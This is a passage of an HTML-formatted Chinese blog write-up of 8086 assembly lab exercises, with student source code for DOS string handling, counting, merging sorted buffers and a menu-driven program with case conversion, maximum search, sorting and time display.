class=\"line\">    mov ds,ax</span><br><span class=\"line\">    lea dx,num    </span><br><span class=\"line\">    </span><br><span class=\"line\">    mov ah,0ah                  ;输入数字到缓冲区</span><br><span class=\"line\">    int 21h</span><br><span class=\"line\">    </span><br><span class=\"line\">    xor ax,ax</span><br><span class=\"line\">    mov al,[num+1]</span><br><span class=\"line\">    mov si,ax</span><br><span class=\"line\">    add si,1ah      </span><br><span class=\"line\">    shr [si],1</span><br><span class=\"line\">    </span><br><span class=\"line\">    jb odd</span><br><span class=\"line\">    </span><br><span class=\"line\">    lea dx,msge</span><br><span class=\"line\">    mov ah,09h</span><br><span class=\"line\">    int 21h</span><br><span class=\"line\">    jmp over</span><br><span class=\"line\">    </span><br><span class=\"line\">    odd:</span><br><span class=\"line\">        lea dx,msgo</span><br><span class=\"line\">        mov ah,09h</span><br><span class=\"line\">        int 21h</span><br><span class=\"line\">                </span><br><span class=\"line\">    over:</span><br><span class=\"line\">        mov ah,4ch</span><br><span class=\"line\">        int 21h</span><br><span class=\"line\">code1 ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"clip_image006-1585749590673.jpg\" alt=\"img\"></p>\n<p><img src=\"clip_image008-1585749590673.jpg\" alt=\"img\"></p>\n<h3 id=\"4-源码\"><a href=\"#4-源码\" class=\"headerlink\" title=\"4.源码\"></a>4.源码</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">data1 segment</span><br><span class=\"line\">    msg db 16</span><br><span class=\"line\">data1 ends</span><br><span class=\"line\"></span><br><span class=\"line\">code1 segment</span><br><span class=\"line\">    assume cs:code1 ds:data1</span><br><span class=\"line\">start:</span><br><span class=\"line\">    mov ax,data1</span><br><span class=\"line\">    mov ds,ax</span><br><span class=\"line\">    </span><br><span class=\"line\">    mov ah,0ah                     ;输入字符串到缓冲区</span><br><span class=\"line\">    int 21h</span><br><span class=\"line\">    </span><br><span class=\"line\">    mov cl,[msg+1]</span><br><span class=\"line\">    </span><br><span class=\"line\">    lea si,msg</span><br><span class=\"line\">    add si,2h</span><br><span class=\"line\">    again:</span><br><span class=\"line\">        cmp [si],65</span><br><span class=\"line\">        jz addd</span><br><span class=\"line\">        inc si</span><br><span class=\"line\">        dec cx</span><br><span class=\"line\">        cmp cx,0</span><br><span class=\"line\">        jz pr</span><br><span class=\"line\">        jnz again</span><br><span class=\"line\">    addd:</span><br><span class=\"line\">        inc si</span><br><span class=\"line\">        inc dx                     ;计数</span><br><span class=\"line\">        cmp cx,0</span><br><span class=\"line\">        dec cx</span><br><span class=\"line\">        jnz again</span><br><span class=\"line\">    pr:</span><br><span class=\"line\">        add dl,30h                 ;技术结果存在dl里</span><br><span class=\"line\">        mov ah,02h                 ;输出dl里面的技术结果</span><br><span class=\"line\">        int 21h</span><br><span class=\"line\">              </span><br><span class=\"line\">        mov ah,4ch</span><br><span class=\"line\">        int 21h</span><br><span class=\"line\"></span><br><span class=\"line\">code1 ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"clip_image010-1585749590673.jpg\" alt=\"img\"></p>\n<h3 id=\"5-源码\"><a href=\"#5-源码\" class=\"headerlink\" title=\"5.源码\"></a>5.源码</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">data1 segment</span><br><span class=\"line\">    buf1 db 05h,31h,33h,34h,36h,37h\t\t;buf1和buf2里面的第一个数字为要排列数字的个数</span><br><span class=\"line\">    buf2 db 04h,32h,35h,37h,39h\t\t    ;设除了第一个数字以外为有效数字，则第一个数字为有效数字的个数</span><br><span class=\"line\">    buf3 db 09h dup(0)\t\t\t\t\t;buf3的第一个数字为需要buf1和buf2有效数字之和</span><br><span class=\"line\">data1 ends</span><br><span class=\"line\"></span><br><span class=\"line\">stack1 segment</span><br><span class=\"line\">    sta db 10h                           ;用到栈，即设置栈</span><br><span class=\"line\">stack1 ends</span><br><span class=\"line\"></span><br><span class=\"line\">code1 segment</span><br><span class=\"line\">    assume cs:code1 ds:data1 ss:stack1</span><br><span class=\"line\">    </span><br><span class=\"line\">    start:</span><br><span class=\"line\">        mov ax,data1</span><br><span class=\"line\">        mov ds,ax</span><br><span class=\"line\">        mov es,ax                         ;设置ds、es</span><br><span class=\"line\">        mov ax,stack1                     ;设置栈段</span><br><span class=\"line\">        mov ss,ax</span><br><span class=\"line\">        </span><br><span class=\"line\">        lea si,buf1+1</span><br><span class=\"line\">        lea di,buf2+1                     ;设置偏移地址</span><br><span class=\"line\">        </span><br><span class=\"line\">        mov ch,buf1</span><br><span class=\"line\">        mov cl,buf2</span><br><span class=\"line\">        </span><br><span class=\"line\">        a1:</span><br><span class=\"line\">            cmp ch,0</span><br><span class=\"line\">            jz ers</span><br><span class=\"line\">            cmp cl,0</span><br><span class=\"line\">            jz yis                        ;ch和cl里分别保存了buf1和buf2的有效数字的个数</span><br><span class=\"line\">            </span><br><span class=\"line\">            mov ah,[si]</span><br><span class=\"line\">            mov al,[di]</span><br><span class=\"line\">            cmp ah,al</span><br><span class=\"line\">            js xiao                       ;进行比较，根据不同结果跳转到不同执行过程</span><br><span class=\"line\">            jz deng</span><br><span class=\"line\">            jns da</span><br><span class=\"line\">            </span><br><span class=\"line\">            xor dx,dx</span><br><span class=\"line\">            xor bl,bl</span><br><span class=\"line\">            xiao:                         ; 前者&lt;后者</span><br><span class=\"line\">                mov dl,ah</span><br><span class=\"line\">                push dx</span><br><span class=\"line\">                inc bl</span><br><span class=\"line\">                inc si</span><br><span class=\"line\">                dec ch</span><br><span class=\"line\">                jmp a1</span><br><span class=\"line\">            </span><br><span class=\"line\">            deng:                          ;前者=后者</span><br><span class=\"line\">                mov dl,ah</span><br><span class=\"line\">                push dx</span><br><span class=\"line\">                inc bl</span><br><span class=\"line\">                inc si</span><br><span class=\"line\">                inc di</span><br><span class=\"line\">                dec ch</span><br><span class=\"line\">                dec cl</span><br><span class=\"line\">                jmp a1</span><br><span class=\"line\">            da:                            ;前者&gt;后者</span><br><span class=\"line\">                mov dl,al</span><br><span class=\"line\">                push dx</span><br><span class=\"line\">                inc bl</span><br><span class=\"line\">                inc di</span><br><span class=\"line\">                dec cl</span><br><span class=\"line\">                jmp a1</span><br><span class=\"line\">            </span><br><span class=\"line\">        yis:                               ;buf1有剩余时</span><br><span class=\"line\">            mov dl,ch</span><br><span class=\"line\">            push dx</span><br><span class=\"line\">            pop cx</span><br><span class=\"line\">            xor dx,dx</span><br><span class=\"line\">            again1:</span><br><span class=\"line\">                mov dl,[si]</span><br><span class=\"line\">                push dx</span><br><span class=\"line\">                inc bl</span><br><span class=\"line\">                inc si</span><br><span class=\"line\">                loop again1</span><br><span class=\"line\">            jmp rev</span><br><span class=\"line\">                </span><br><span class=\"line\">        ers:                                ;buf2有剩余时</span><br><span class=\"line\">            xor dx,dx</span><br><span class=\"line\">            again2:</span><br><span class=\"line\">                mov dl,[di]</span><br><span class=\"line\">                push dx </span><br><span class=\"line\">                inc bl</span><br><span class=\"line\">                inc di</span><br><span class=\"line\">                loop again2</span><br><span class=\"line\">            jmp rev</span><br><span class=\"line\">        rev:                                ;数据压入栈后倒叙输出，并输出到指定内存位置（即buf3的位置）</span><br><span class=\"line\">            lea si,buf3</span><br><span class=\"line\">            add si,bx</span><br><span class=\"line\">            dec si</span><br><span class=\"line\">            again: </span><br><span class=\"line\">                cmp sp,0h</span><br><span class=\"line\">                jz over</span><br><span class=\"line\">                pop dx</span><br><span class=\"line\">                mov [si],dl</span><br><span class=\"line\">                dec si</span><br><span class=\"line\">                loop again    </span><br><span class=\"line\">                        </span><br><span class=\"line\">        over:</span><br><span class=\"line\">            mov ah,4ch</span><br><span class=\"line\">            int 21h</span><br><span class=\"line\">code1 ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n\n<p>程序开始时的内存状态：</p>\n<p><img src=\"clip_image012-1585749590673.jpg\" alt=\"img\"></p>\n<p>运行后的栈内情况：</p>\n<p><img src=\"clip_image014-1585749590673.jpg\" alt=\"img\"></p>\n<p>运行后的内存情况（排序结果紧随其后）</p>\n<p><img src=\"clip_image016-1585749590673.jpg\" alt=\"img\"></p>\n<h1 id=\"实验三-综合程序设计\"><a href=\"#实验三-综合程序设计\" class=\"headerlink\" title=\"实验三 综合程序设计\"></a>实验三 综合程序设计</h1><h2 id=\"实验要求-2\"><a href=\"#实验要求-2\" class=\"headerlink\" title=\"实验要求\"></a>实验要求</h2><p>编写程序实现下列5项功能，通过从键盘输入1～5进行菜单式选择：</p>\n<ol>\n<li>按数字键“1”，完成将字符串中的小写字母变换成大写字母。用户输入由英文大小写字母或数字0～9组成的字符串（以回车结束），变换后按下列格式在屏幕上显示：</li>\n</ol>\n<p>&lt;原字符串&gt;例如：abcdgyt0092</p>\n<p>&lt;新字符串&gt; ABCDGYT0092</p>\n<p>按任一键重做；按Esc键返回主菜单。</p>\n<ol start=\"2\">\n<li>按数字键“2”，完成在字符串中找最大值。用户输入由英文大小写字母或数字0～9 组成的字符串（以回车结束），找出其中数字字符的最大值，按下列格式在屏幕上显示：</li>\n</ol>\n<p>&lt;原字符串&gt; The maximum number is &lt;最大值&gt;．</p>\n<p>按任一键重做；按Esc键返回主菜单。</p>\n<ol start=\"3\">\n<li>按数字键“3”，完成输入数据组的排序。用户输入一组（小于50个）十进制数值（小于255），中间以逗号分隔，回车表示输入结束。按递增方式进行排序，并将结果按下列格式在屏幕上显示：</li>\n</ol>\n<p>&lt;原数值串&gt;</p>\n<p>&lt;新数值串&gt;</p>\n<p>按任一键重做；按Esc键返回主菜单。</p>\n<ol start=\"4\">\n<li>按数字键“4”，完成系统时间的显示。首先提示用户对时，即改变系统的定时器HH：MM：SS（以冒号间隔，回车结束），然后在屏幕的右上角实时显示出时间：HH：MM：SS。</li>\n</ol>\n<p>按任一键重新对时；按Esc键返回主菜单。</p>\n<ol start=\"5\">\n<li>按数字键“5”，结束程序的运行，返回系统。</li>\n</ol>\n<p>请提前做好上级预习工作。</p>\n<h2 id=\"实验目的-2\"><a href=\"#实验目的-2\" class=\"headerlink\" title=\"实验目的\"></a>实验目的</h2><p>学习掌握DOS常用功能的调用方法，综合进行程序设计。增强和提高汇编语言程序设计的能力，掌握模块化程序的设计方法。</p>\n<h2 id=\"实验内容-2\"><a href=\"#实验内容-2\" class=\"headerlink\" title=\"实验内容\"></a>实验内容</h2><h3 id=\"1-源码-1\"><a href=\"#1-源码-1\" class=\"headerlink\" title=\"1.源码\"></a>1.源码</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">data1 segment</span><br><span class=\"line\">    org 0</span><br><span class=\"line\">    info11 db &quot;Please press keys:$&quot;</span><br><span class=\"line\">    info12 db &quot;translated to:$&quot;</span><br><span class=\"line\">          </span><br><span class=\"line\">    info21 db &quot;Please input the string:$&quot;</span><br><span class=\"line\">    info22 db &quot;The max is:$&quot;</span><br><span class=\"line\">        </span><br><span class=\"line\">    info41 db &quot;Please correct the time:$&quot;</span><br><span class=\"line\">        </span><br><span class=\"line\">    in1 db 16</span><br><span class=\"line\">    out1 db 16</span><br><span class=\"line\">    </span><br><span class=\"line\">    in2 db 16</span><br><span class=\"line\">    out2 db 1</span><br><span class=\"line\">    </span><br><span class=\"line\">    in31 db 50</span><br><span class=\"line\">    in311 db 49 dup(0)</span><br><span class=\"line\">    in32 db 255 </span><br><span class=\"line\">    </span><br><span class=\"line\">    time4 db &quot;00:00:00$&quot;</span><br><span class=\"line\">         </span><br><span class=\"line\">    str1 db &quot;Please switch the function number&quot;,0ah,0dh,&quot;1.lower to upper&quot;,0ah,0dh,&quot;2.find the max&quot;,0ah,0dh,&quot;3.sort the number&quot;,0ah,0dh,&quot;4.display the time&quot;,0ah,0dh,&quot;5.exit the system&quot;,0ah,0dh,&quot;$&quot;         </span><br><span class=\"line\">data1 ends</span><br><span class=\"line\"></span><br><span class=\"line\">stack1 segment</span><br><span class=\"line\">    stack dw 100</span><br><span class=\"line\">stack1 ends</span><br><span class=\"line\"></span><br><span class=\"line\">code1 segment</span><br><span class=\"line\">    assume cs:code1 ds:data1</span><br><span class=\"line\">    </span><br><span class=\"line\">    start:</span><br><span class=\"line\">        mov ax,data1</span><br><span class=\"line\">        mov ds,ax</span><br><span class=\"line\"></span><br><span class=\"line\">    menu:</span><br><span class=\"line\">        call clear</span><br><span class=\"line\">        </span><br><span class=\"line\">        lea dx,str1</span><br><span class=\"line\">        mov ah,09h</span><br><span class=\"line\">        int 21h</span><br><span class=\"line\">        </span><br><span class=\"line\">        mov ah,01h</span><br><span class=\"line\">        int 21h    </span><br><span class=\"line\">        cmp al,31h</span><br><span class=\"line\">        jz fun1 </span><br><span class=\"line\">        cmp al,32h</span><br><span class=\"line\">        jz fun2         </span><br><span class=\"line\">        cmp al,33h</span><br><span class=\"line\">        jz fun3         </span><br><span class=\"line\">        cmp al,34h</span><br><span class=\"line\">        jz fun4           </span><br><span class=\"line\">        cmp al,35h</span><br><span class=\"line\">        jz over</span><br><span class=\"line\">        </span><br><span class=\"line\">    fun1:</span><br><span class=\"line\">        call clear         ;clear the screen</span><br><span class=\"line\">        </span><br><span class=\"line\">        call fun11</span><br><span class=\"line\">        mov ah,0h</span><br><span class=\"line\">        int 16h</span><br><span class=\"line\">        cmp ah,01h</span><br><span class=\"line\">        jz menu</span><br><span class=\"line\">        jnz fun1</span><br><span class=\"line\">         </span><br><span class=\"line\">             </span><br><span class=\"line\">    fun2:</span><br><span class=\"line\">        call clear</span><br><span class=\"line\">         </span><br><span class=\"line\">        call fun22 </span><br><span class=\"line\">        mov ah,0h</span><br><span class=\"line\">        int 16h</span><br><span class=\"line\">        cmp ah,01h</span><br><span class=\"line\">        jz menu</span><br><span class=\"line\">        jnz fun2</span><br><span class=\"line\">   </span><br><span class=\"line\">    fun3:</span><br><span class=\"line\">        call clear</span><br><span class=\"line\">        </span><br><span class=\"line\">        call fun33 </span><br><span class=\"line\">        mov ah,0h</span><br><span class=\"line\">        int 16h</span><br><span class=\"line\">        cmp ah,01h</span><br><span class=\"line\">        jz menu</span><br><span class=\"line\">        jnz fun3</span><br><span class=\"line\">            </span><br><span class=\"line\">    fun4:</span><br><span class=\"line\">        call clear</span><br><span class=\"line\">        </span><br><span class=\"line\">        call fun44</span><br><span class=\"line\">        mov ah,0h</span><br><span class=\"line\">        int 16h</span><br><span class=\"line\">        cmp ah,01h</span><br><span class=\"line\">        jz menu</span><br><span class=\"line\">        jnz fun4</span><br><span class=\"line\">                                </span><br><span class=\"line\">    fun11 proc near    </span><br><span class=\"line\">        lea dx,info11</span><br><span class=\"line\">        mov ah,09h</span><br><span class=\"line\">        int 21h          ;display &quot;Press...&quot;</span><br><span class=\"line\">        </span><br><span class=\"line\">        lea dx,in1</span><br><span class=\"line\">        mov ah,0ch</span><br><span class=\"line\">        mov al,0ah</span><br><span class=\"line\">        int 21h          ;input the string</span><br><span class=\"line\">        </span><br><span class=\"line\">        lea si,in1</span><br><span class=\"line\">        inc si</span><br><span class=\"line\">        </span><br><span class=\"line\">        mov cl,[si]</span><br><span class=\"line\">        inc cl</span><br><span class=\"line\">        again11:          ;loop of check</span><br><span class=\"line\">            dec cl</span><br><span class=\"line\">            cmp cl,0h</span><br><span class=\"line\">            jz output1</span><br><span class=\"line\">            inc si</span><br><span class=\"line\">            cmp [si],61h</span><br><span class=\"line\">            jc again11</span><br><span class=\"line\">            cmp [si],7ah</span><br><span class=\"line\">            ja again11</span><br><span class=\"line\">            sub [si],20h</span><br><span class=\"line\">            jmp again11</span><br><span class=\"line\">            </span><br><span class=\"line\">         output1:         ;output the result</span><br><span class=\"line\">            call sl       ;set the location</span><br><span class=\"line\">                   </span><br><span class=\"line\">            lea dx,info12</span><br><span class=\"line\">            mov ah,09h</span><br><span class=\"line\">            int 21h</span><br><span class=\"line\">            mov [si+1],24h</span><br><span class=\"line\">            lea dx,in1</span><br><span class=\"line\">            add dx,2h</span><br><span class=\"line\">            mov ah,09h</span><br><span class=\"line\">            int 21h     </span><br><span class=\"line\">         ret</span><br><span class=\"line\">    fun11 endp</span><br><span class=\"line\">    </span><br><span class=\"line\">    fun22 proc near</span><br><span class=\"line\">        lea dx,info21</span><br><span class=\"line\">        mov ah,09h</span><br><span class=\"line\">        int 21h           ;display &quot;Please input the string&quot;</span><br><span class=\"line\">        </span><br><span class=\"line\">        lea dx,in2</span><br><span class=\"line\">        mov ah,0ch</span><br><span class=\"line\">        mov al,0ah</span><br><span class=\"line\">        int 21h           ;input the string</span><br><span class=\"line\">         </span><br><span class=\"line\">        xor cx,cx </span><br><span class=\"line\">        lea si,in2</span><br><span class=\"line\">        inc si</span><br><span class=\"line\">        mov cl,[si]</span><br><span class=\"line\">        inc cl</span><br><span class=\"line\">        xor bx,bx</span><br><span class=\"line\">        again2:</span><br><span class=\"line\">            dec cl </span><br><span class=\"line\">            cmp cl,0h</span><br><span class=\"line\">            jz output2</span><br><span class=\"line\">            inc si</span><br><span class=\"line\">            cmp [si],bl</span><br><span class=\"line\">            jc again2</span><br><span class=\"line\">            mov bl,[si]</span><br><span class=\"line\">            jmp again2</span><br><span class=\"line\">        </span><br><span class=\"line\">        output2:</span><br><span class=\"line\">            call sl</span><br><span class=\"line\">            </span><br><span class=\"line\">            lea dx,info22</span><br><span class=\"line\">            mov ah,09h</span><br><span class=\"line\">            int 21h</span><br><span class=\"line\">            </span><br><span class=\"line\">            lea si,out2</span><br><span class=\"line\">            mov [si],bl</span><br><span class=\"line\">            mov [si+1],24h</span><br><span class=\"line\">            lea dx,out2</span><br><span class=\"line\">            mov ah,09h</span><br><span class=\"line\">            int 21h       </span><br><span class=\"line\">    ret</span><br><span class=\"line\">    fun22 endp</span><br><span class=\"line\">    </span><br><span class=\"line\">    fun33 proc near</span><br><span class=\"line\">    so_s: </span><br><span class=\"line\">        mov ah, 0aH  </span><br><span class=\"line\">        lea si, in32</span><br><span class=\"line\">        mov dx, si</span><br><span class=\"line\">        lea di, in31</span><br><span class=\"line\">        int 21H</span><br><span class=\"line\">        inc si</span><br><span class=\"line\">        mov ds:[di], 0 </span><br><span class=\"line\">        mov cx, ds:[si]</span><br><span class=\"line\">        and cx, 00FFH</span><br><span class=\"line\">        mov bh, 0 </span><br><span class=\"line\">        mov bl, 1</span><br><span class=\"line\">        mov bp, 0 </span><br><span class=\"line\">        mov dl, 0</span><br><span class=\"line\">        mov ax, 0</span><br><span class=\"line\">    so_1:</span><br><span class=\"line\">        inc bp</span><br><span class=\"line\">        inc bh</span><br><span class=\"line\">        mov dh,ds:[si+bp]   </span><br><span class=\"line\">        cmp dh, &apos;,&apos;</span><br><span class=\"line\">        jz  so_2 </span><br><span class=\"line\">        inc bh</span><br><span class=\"line\">        cmp cx,1</span><br><span class=\"line\">        jz so_2 </span><br><span class=\"line\">        dec bh</span><br><span class=\"line\">        jmp so_3</span><br><span class=\"line\">    so_2:</span><br><span class=\"line\">        add bl, 1 </span><br><span class=\"line\">        cmp bh, bl</span><br><span class=\"line\">        jz  st_1</span><br><span class=\"line\">        add bl, 1</span><br><span class=\"line\">        cmp bh, bl       </span><br><span class=\"line\">        jz  st_2</span><br><span class=\"line\">        add bl, 1</span><br><span class=\"line\">        cmp bh, bl</span><br><span class=\"line\">        jz  st_3 </span><br><span class=\"line\">        jmp so_3</span><br><span class=\"line\">    st_1:</span><br><span class=\"line\">        sub bl, 1</span><br><span class=\"line\">        push bx </span><br><span class=\"line\">        push si</span><br><span class=\"line\">        mov bh, 0</span><br><span class=\"line\">        add si, bx</span><br><span class=\"line\">        mov al, ds:[si]</span><br><span class=\"line\">        sub al, 30H</span><br><span class=\"line\">        pop si</span><br><span class=\"line\">        pop bx</span><br><span class=\"line\">        jmp st_4</span><br><span class=\"line\">    st_2:</span><br><span class=\"line\">        sub bl, 2</span><br><span class=\"line\">        push bx </span><br><span class=\"line\">        push si</span><br><span class=\"line\">        mov bh, 0 </span><br><span class=\"line\">        add si, bx</span><br><span class=\"line\">        mov al, ds:[si]</span><br><span class=\"line\">        sub al, 30H </span><br><span class=\"line\">        mov dl, 10</span><br><span class=\"line\">        mul dl</span><br><span class=\"line\">        add al, ds:[si+1]</span><br><span class=\"line\">        sub al, 30H  </span><br><span class=\"line\">        pop si</span><br><span class=\"line\">        pop bx</span><br><span class=\"line\">        jmp st_4</span><br><span class=\"line\">    st_3:</span><br><span class=\"line\">        sub bl, 3 </span><br><span class=\"line\">        push bx</span><br><span class=\"line\">        push si</span><br><span class=\"line\">        mov bh, 0</span><br><span class=\"line\">        add si, bx</span><br><span class=\"line\">        mov al, ds:[si]</span><br><span class=\"line\">        sub al, 30H</span><br><span class=\"line\">        mov dl, 100</span><br><span class=\"line\">        mul dl</span><br><span class=\"line\">        mov bh, al</span><br><span class=\"line\">        mov al, ds:[si+1]</span><br><span class=\"line\">        sub al, 30H</span><br><span class=\"line\">        mov dl, 10</span><br><span class=\"line\">        mul dl</span><br><span class=\"line\">        add bh, al</span><br><span class=\"line\">        add bh, ds:[si+2]</span><br><span class=\"line\">        sub bh, 30H</span><br><span class=\"line\">        mov al, bh </span><br><span class=\"line\">        pop si</span><br><span class=\"line\">        pop bx</span><br><span class=\"line\">        jmp st_4</span><br><span class=\"line\">    st_4:</span><br><span class=\"line\">        mov bl, bh</span><br><span class=\"line\">        inc bl  </span><br><span class=\"line\">        inc dl</span><br><span class=\"line\">        push bp</span><br><span class=\"line\">        inc ds:[di]</span><br><span class=\"line\">        mov bp, ds:[di] </span><br><span class=\"line\">        and bp, 00FFH</span><br><span class=\"line\">        mov ds:[bp+di], al</span><br><span class=\"line\">        pop bp</span><br><span class=\"line\">    so_3:</span><br><span class=\"line\">        loop so_1</span><br><span class=\"line\">        push dx</span><br><span class=\"line\">        push si</span><br><span class=\"line\">        push cx</span><br><span class=\"line\">        push ax</span><br><span class=\"line\">        push bp</span><br><span class=\"line\">        push bx</span><br><span class=\"line\">        call bubble</span><br><span class=\"line\">        pop bx </span><br><span class=\"line\">        pop bp</span><br><span class=\"line\">        pop ax</span><br><span class=\"line\">        pop cx</span><br><span class=\"line\">        pop si</span><br><span class=\"line\">        pop dx   </span><br><span class=\"line\">        lea dx, in31</span><br><span class=\"line\">        mov si, dx </span><br><span class=\"line\">        lea dx, in32</span><br><span class=\"line\">        mov di, dx</span><br><span class=\"line\">        mov bl, 10</span><br><span class=\"line\">        mov cx, ds:[si]</span><br><span class=\"line\">        and cx, 00FFH </span><br><span class=\"line\">        inc di</span><br><span class=\"line\">        mov bp, 0</span><br><span class=\"line\">    so_4:</span><br><span class=\"line\">        inc bp</span><br><span class=\"line\">        mov ah, 0H</span><br><span class=\"line\">        mov al, ds:[si+bp]</span><br><span class=\"line\">        cmp al, 99</span><br><span class=\"line\">        ja so_5</span><br><span class=\"line\">        cmp al, 9</span><br><span class=\"line\">        ja so_6</span><br><span class=\"line\">        jmp so_7</span><br><span class=\"line\">    so_5:</span><br><span class=\"line\">        div bl</span><br><span class=\"line\">        mov dh, ah</span><br><span class=\"line\">        mov ah, 00H</span><br><span class=\"line\">        div bl </span><br><span class=\"line\">        add al, 30H</span><br><span class=\"line\">        mov ds:[di+1], al</span><br><span class=\"line\">        add ah, 30H</span><br><span class=\"line\">        mov ds:[di+2], ah</span><br><span class=\"line\">        add dh, 30H</span><br><span class=\"line\">        mov ds:[di+3], dh</span><br><span class=\"line\">        mov ds:[di+4], &apos;,&apos;</span><br><span class=\"line\">        add di, 4 </span><br><span class=\"line\">        jmp so_8  </span><br><span class=\"line\">    so_6:</span><br><span class=\"line\">        div bl </span><br><span class=\"line\">        add al, 30H</span><br><span class=\"line\">        mov ds:[di+1], al</span><br><span class=\"line\">        add ah, 30H </span><br><span class=\"line\">        mov ds:[di+2], ah</span><br><span class=\"line\">        mov ds:[di+3], &apos;,&apos;</span><br><span class=\"line\">        add di, 3</span><br><span class=\"line\">        jmp so_8</span><br><span class=\"line\">    so_7:</span><br><span class=\"line\">        add al,30H</span><br><span class=\"line\">        mov ds:[di+1], al</span><br><span class=\"line\">        mov ds:[di+2], &apos;,&apos;</span><br><span class=\"line\">        add di, 2</span><br><span class=\"line\">    so_8:</span><br><span class=\"line\">        loop so_4</span><br><span class=\"line\">        mov ds:[di+1], &apos;$&apos;</span><br><span class=\"line\">        mov ah, 03H  </span><br><span class=\"line\">        mov bh, 0H</span><br><span class=\"line\">        int 10H</span><br><span class=\"line\">        add dh, 01H</span><br><span class=\"line\">        mov dl, 0</span><br><span class=\"line\">        mov ah, 02H</span><br><span class=\"line\">        int 10H</span><br><span class=\"line\">        lea dx, in32</span><br><span class=\"line\">        inc dx</span><br><span class=\"line\">        inc dx</span><br><span class=\"line\">        mov ah, 09H</span><br><span class=\"line\">        int 21H      </span><br><span class=\"line\">    ret    </span><br><span class=\"line\">    fun33 endp</span><br><span class=\"line\"> </span><br><span class=\"line\">    bubble proc near</span><br><span class=\"line\">        lea dx, in31</span><br><span class=\"line\">        mov si, dx</span><br><span class=\"line\">        mov cx, ds:[si]</span><br><span class=\"line\">        and cx, 00FFH </span><br><span class=\"line\">        inc si </span><br><span class=\"line\">        mov bp, 0FFFFH</span><br><span class=\"line\">        mov ah, 0 </span><br><span class=\"line\">        mov al, 0</span><br><span class=\"line\">    bu_1:</span><br><span class=\"line\">        inc bp</span><br><span class=\"line\">        mov ah, ds:[si+bp]</span><br><span class=\"line\">        mov bh, ah</span><br><span class=\"line\">        mov dx, bp</span><br><span class=\"line\">        push cx</span><br><span class=\"line\">        push bp</span><br><span class=\"line\">        dec cx</span><br><span class=\"line\">    bu_3:</span><br><span class=\"line\">        inc bp</span><br><span class=\"line\">        mov al, ds:[si+bp] </span><br><span class=\"line\">        cmp cx, 0</span><br><span class=\"line\">        jz bu_6</span><br><span class=\"line\">        cmp al, ah </span><br><span class=\"line\">        jna bu_4</span><br><span class=\"line\">        jmp bu_5</span><br><span class=\"line\">    bu_4:</span><br><span class=\"line\">        mov ah, al</span><br><span class=\"line\">        mov dx, bp </span><br><span class=\"line\">    bu_5:</span><br><span class=\"line\">        loop bu_3</span><br><span class=\"line\">    bu_6:</span><br><span class=\"line\">        pop bp</span><br><span class=\"line\">        pop cx</span><br><span class=\"line\">        mov ds:[si+bp], ah</span><br><span class=\"line\">        push bp</span><br><span class=\"line\">        mov bp, dx</span><br><span class=\"line\">        mov ds:[si+bp], bh</span><br><span class=\"line\">        pop bp</span><br><span class=\"line\">        loop bu_1    </span><br><span class=\"line\">    ret</span><br><span class=\"line\">    bubble endp</span><br><span class=\"line\">    </span><br><span class=\"line\">    fun44 proc near</span><br><span class=\"line\">        lea dx,info41</span><br><span class=\"line\">        mov ah,09h</span><br><span class=\"line\">        int 21h</span><br><span class=\"line\">        </span><br><span class=\"line\">        mov ah,2ch</span><br><span class=\"line\">        int 21h</span><br><span class=\"line\">        </span><br><span class=\"line\">        xor ax,ax</span><br><span class=\"line\">        xor bx,bx</span><br><span class=\"line\">        mov al,ch</span><br><span class=\"line\">        lea si,time4</span><br><span class=\"line\">        mov bl,0ah</span><br><span class=\"line\">        mov al,ch</span><br><span class=\"line\">        div bl</span><br><span class=\"line\">        mov [si],al</span><br><span class=\"line\">        add [si],30h</span><br><span class=\"line\">        inc si</span><br><span class=\"line\">        mov [si],ah</span><br><span class=\"line\">        add [si],30h</span><br><span class=\"line\">        add si,2h</span><br><span class=\"line\">        </span><br><span class=\"line\">        xor ax,ax</span><br><span class=\"line\">        mov al,cl</span><br><span class=\"line\">        div bl</span><br><span class=\"line\">        mov [si],al</span><br><span class=\"line\">        add [si],30h</span><br><span class=\"line\">        inc si</span><br><span class=\"line\">        mov [si],ah</span><br><span class=\"line\">        add [si],30h</span><br><span class=\"line\">        add si,2h</span><br><span class=\"line\">        </span><br><span class=\"line\">        xor ax,ax</span><br><span class=\"line\">        mov al,dh</span><br><span class=\"line\">        div bl</span><br><span class=\"line\">        mov [si],al</span><br><span class=\"line\">        add [si],30h</span><br><span class=\"line\">        inc si</span><br><span class=\"line\">        mov [si],ah</span><br><span class=\"line\">        add [si],30h</span><br><span class=\"line\">        add si,2h           </span><br><span class=\"line\">        </span><br><span class=\"line\">        mov ah,02h</span><br><span class=\"line\">        mov bh,0h</span><br><span class=\"line\">        mov dh,00h</span><br><span class=\"line\">        mov dl,48h     </span><br><span class=\"line\">        int 10h </span><br><span class=\"line\">        </span><br><span class=\"line\">        lea dx,time4</span><br><span class=\"line\">        mov ah,09h</span><br><span class=\"line\">        int 21h </span><br><span class=\"line\">    ret</span><br><span class=\"line\">    fun44 endp</span><br><span class=\"line\">    </span><br><span class=\"line\">    clear proc near</span><br><span class=\"line\">        mov ah,0h</span><br><span class=\"line\">        mov al,3h</span><br><span class=\"line\">        mov bl,0</span><br><span class=\"line\">        int 10h</span><br><span class=\"line\">        ret </span><br><span class=\"line\">    clear endp </span><br><span class=\"line\">    </span><br><span class=\"line\">    sl proc near</span><br><span class=\"line\">        mov ah,02h</span><br><span class=\"line\">        mov bh,0h</span><br><span class=\"line\">        mov dh,01h</span><br><span class=\"line\">        mov dl,0h     </span><br><span class=\"line\">        int 10h</span><br><span class=\"line\">    ret</span><br><span class=\"line\">    sl endp </span><br><span class=\"line\">              </span><br><span class=\"line\">    over:</span><br><span class=\"line\">        mov ah,4ch</span><br><span class=\"line\">        int 21h</span><br><span class=\"line\">code1 ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"实验结果\"><a href=\"#实验结果\" class=\"headerlink\" title=\"实验结果\"></a>实验结果</h2><h3 id=\"开始的菜单界面\"><a href=\"#开始的菜单界面\" class=\"headerlink\" title=\"开始的菜单界面\"></a>开始的菜单界面</h3><p><img 